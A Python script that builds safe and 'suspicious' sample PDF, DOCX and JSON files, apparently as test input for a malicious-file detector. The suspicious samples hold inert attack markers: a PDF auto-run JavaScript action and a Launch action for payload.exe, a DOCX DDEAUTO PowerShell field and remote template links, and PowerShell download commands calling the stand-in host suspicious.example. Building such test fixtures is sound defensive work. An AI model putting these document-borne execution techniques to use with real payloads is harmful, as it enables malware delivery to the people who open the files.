import io
import json
import os
import zipfile
from pathlib import Path


ROOT = Path(__file__).resolve().parent
SAMPLE_DIR = ROOT / "sample_test_files"
SAFE_DIR = SAMPLE_DIR / "safe"
SUSPICIOUS_DIR = SAMPLE_DIR / "suspicious"


def ensure_dirs():
    SAFE_DIR.mkdir(parents=True, exist_ok=True)
    SUSPICIOUS_DIR.mkdir(parents=True, exist_ok=True)


def write_text_pdf(path: Path, title: str, paragraphs, suspicious=False):
    objects = []

    def add_object(body: str):
        objects.append(body)
        return len(objects)

    font_id = add_object("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")

    lines = [f"{title}"] + list(paragraphs)
    text_chunks = []
    for index, line in enumerate(lines):
        safe_line = line.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
        y_position = max(70, 780 - (index * 16))
        text_chunks.append(f"BT /F1 11 Tf 48 {y_position} Td ({safe_line}) Tj ET")
    content_stream = "\n".join(text_chunks)
    content_id = add_object(
        f"<< /Length {len(content_stream.encode('latin-1', errors='ignore'))} >>\nstream\n"
        f"{content_stream}\nendstream"
    )

    page_extras = ""
    catalog_extras = ""
    if suspicious:
        js_stream = "app.alert('Suspicious PDF execution path');"
        js_id = add_object(f"<< /Length {len(js_stream)} >>\nstream\n{js_stream}\nendstream")
        action_id = add_object(f"<< /S /JavaScript /JS {js_id} 0 R >>")
        embedded_id = add_object("<< /Type /EmbeddedFile /Subtype /application#2Foctet-stream /Length 512 >>")
        launch_id = add_object("<< /S /Launch /F (payload.exe) >>")
        page_extras = f" /AA << /O {launch_id} 0 R >> /Names << /EmbeddedFiles << /Names [(payload.bin) {embedded_id} 0 R] >> >>"
        catalog_extras = f" /OpenAction {action_id} 0 R"

    page_id = add_object(
        f"<< /Type /Page /Parent 0 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 {font_id} 0 R >> >> "
        f"/Contents {content_id} 0 R{page_extras} >>"
    )
    pages_id = add_object(f"<< /Type /Pages /Kids [{page_id} 0 R] /Count 1 >>")
    catalog_id = add_object(f"<< /Type /Catalog /Pages {pages_id} 0 R{catalog_extras} >>")
    objects[page_id - 1] = objects[page_id - 1].replace("/Parent 0 0 R", f"/Parent {pages_id} 0 R")

    buffer = io.StringIO()
    buffer.write("%PDF-1.4\n%\u00e2\u00e3\u00cf\u00d3\n")
    offsets = []
    for object_id, body in enumerate(objects, start=1):
        offsets.append(buffer.tell())
        buffer.write(f"{object_id} 0 obj\n{body}\nendobj\n")

    xref_position = buffer.tell()
    buffer.write(f"xref\n0 {len(objects) + 1}\n")
    buffer.write("0000000000 65535 f \n")
    for offset in offsets:
        buffer.write(f"{offset:010d} 00000 n \n")
    buffer.write(
        f"trailer\n<< /Size {len(objects) + 1} /Root {catalog_id} 0 R >>\nstartxref\n{xref_position}\n%%EOF\n"
    )
    path.write_bytes(buffer.getvalue().encode("latin-1", errors="ignore"))


def build_docx(path: Path, title: str, paragraphs, suspicious=False):
    body_blocks = []
    for text in [title] + list(paragraphs):
        clean_text = (
            str(text)
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
        )
        body_blocks.append(f"<w:p><w:r><w:t xml:space=\"preserve\">{clean_text}</w:t></w:r></w:p>")

    if suspicious:
        body_blocks.extend(
            [
                "<w:p><w:r><w:t>Security review trigger text for macro-enabled workflow.</w:t></w:r></w:p>",
                "<w:p><w:r><w:instrText>DDEAUTO powershell -enc ZQBjAGgAbwA=</w:instrText></w:r></w:p>",
                "<w:p><w:r><w:t>External template and embedded object references are present in this package.</w:t></w:r></w:p>",
            ]
        )

    document_xml = (
        "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>"
        "<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\" "
        "xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\" "
        "xmlns:o=\"urn:schemas-microsoft-com:office:office\">"
        "<w:body>"
        + "".join(body_blocks)
        + ("<w:p><w:r><w:object><o:OLEObject Type=\"Embed\"/></w:object></w:r></w:p>" if suspicious else "")
        + "<w:sectPr/></w:body></w:document>"
    )

    rels_entries = [
        "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>"
        "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
        "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"word/document.xml\"/>"
    ]
    if suspicious:
        rels_entries.append(
            "<Relationship Id=\"rId2\" "
            "Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" "
            "Target=\"http://suspicious.example/payload.dotm\" TargetMode=\"External\"/>"
        )
    rels_entries.append("</Relationships>")
    root_rels = "".join(rels_entries)

    document_rels = (
        "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>"
        "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
        + (
            "<Relationship Id=\"rId5\" "
            "Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink\" "
            "Target=\"http://suspicious.example/dropper\" TargetMode=\"External\"/>"
            if suspicious
            else ""
        )
        + "</Relationships>"
    )

    content_types = (
        "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>"
        "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">"
        "<Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>"
        "<Default Extension=\"xml\" ContentType=\"application/xml\"/>"
        "<Override PartName=\"/word/document.xml\" "
        "ContentType=\"application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml\"/>"
        + (
            "<Override PartName=\"/word/vbaProject.bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/>"
            if suspicious
            else ""
        )
        + "</Types>"
    )

    with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("[Content_Types].xml", content_types)
        archive.writestr("_rels/.rels", root_rels)
        archive.writestr("word/document.xml", document_xml)
        archive.writestr("word/_rels/document.xml.rels", document_rels)
        archive.writestr("docProps/core.xml", "<cp:coreProperties xmlns:cp=\"http://schemas.openxmlformats.org/package/2006/metadata/core-properties\"/>")
        archive.writestr(
            zipfile.ZipInfo("word/media/image1.bin"),
            os.urandom(140000 if not suspicious else 180000),
        )
        if suspicious:
            archive.writestr(
                zipfile.ZipInfo("word/vbaProject.bin"),
                os.urandom(90000) + b"macro-payload" + os.urandom(90000),
            )
            archive.writestr(
                zipfile.ZipInfo("word/embeddings/object1.bin"),
                os.urandom(160000),
            )


def write_json(path: Path, suspicious=False):
    if suspicious:
        obj = {
            "profile": "suspicious-sample",
            "description": "Large JSON sample used to demonstrate encoded payload density, URLs, and command-like fields.",
            "command": "powershell -enc ZQBjAGgAbwA=",
            "download_url": "http://suspicious.example/payload.exe",
            "artifacts": [
                {
                    "id": index,
                    "endpoint": f"http://suspicious.example/api/{index}",
                    "payload": ("SGVsbG8=" * 80) + ("QUJDREVGR0g=" * 40),
                    "notes": "encoded command transport and external delivery route",
                    "script": "Invoke-WebRequest http://suspicious.example/dropper"
                }
                for index in range(1, 181)
            ],
            "metadata": {
                "source": "threat-simulation",
                "risk": "high",
                "tags": ["payload", "botnet", "phishing", "dropper", "powershell"],
            },
        }
    else:
        obj = {
            "profile": "safe-sample",
            "description": "Large structured JSON report used to test normal parsing, nested arrays, and regular business-style content.",
            "inventory": [
                {
                    "record_id": index,
                    "department": f"Ops-{(index % 9) + 1}",
                    "owner": f"user_{index:03d}",
                    "status": "active" if index % 5 else "review",
                    "items": [
                        {
                            "name": f"asset-{index}-{inner}",
                            "quantity": (inner % 7) + 1,
                            "region": ["IN", "US", "EU", "APAC"][inner % 4],
                        }
                        for inner in range(1, 9)
                    ],
                }
                for index in range(1, 241)
            ],
            "metadata": {
                "schema_version": "1.3",
                "generated_for": "sample validation",
                "record_count": 240,
            },
        }

    path.write_text(json.dumps(obj, indent=2), encoding="utf-8")


def main():
    ensure_dirs()

    safe_paragraphs = [
        f"Section {index}: This sample PDF contains standard report content for inventory, operations, and compliance review."
        for index in range(1, 151)
    ]
    suspicious_paragraphs = [
        f"Object {index}: Review marker for embedded execution flow, launch actions, and suspicious payload behavior."
        for index in range(1, 151)
    ]
    write_text_pdf(SAFE_DIR / "safe.pdf", "Safe Enterprise PDF Report", safe_paragraphs, suspicious=False)
    write_text_pdf(SUSPICIOUS_DIR / "bad.pdf", "Suspicious PDF Execution Report", suspicious_paragraphs, suspicious=True)

    safe_doc_paragraphs = [
        f"Business record paragraph {index}. This document stores routine operating procedures, reports, and review notes."
        for index in range(1, 221)
    ]
    suspicious_doc_paragraphs = [
        f"Threat simulation paragraph {index}. This document includes control text, automation hooks, and external content references."
        for index in range(1, 221)
    ]
    build_docx(SAFE_DIR / "safe.docx", "Safe Operations Report", safe_doc_paragraphs, suspicious=False)
    build_docx(SUSPICIOUS_DIR / "bad.docx", "Suspicious Operations Report", suspicious_doc_paragraphs, suspicious=True)

    write_json(SAFE_DIR / "safe.json", suspicious=False)
    write_json(SUSPICIOUS_DIR / "bad.json", suspicious=True)

    print("Large sample files generated:")
    for path in sorted(SAMPLE_DIR.rglob("*")):
        if path.is_file():
            print(f"- {path.relative_to(ROOT)} -> {path.stat().st_size} bytes")


if __name__ == "__main__":
    main()
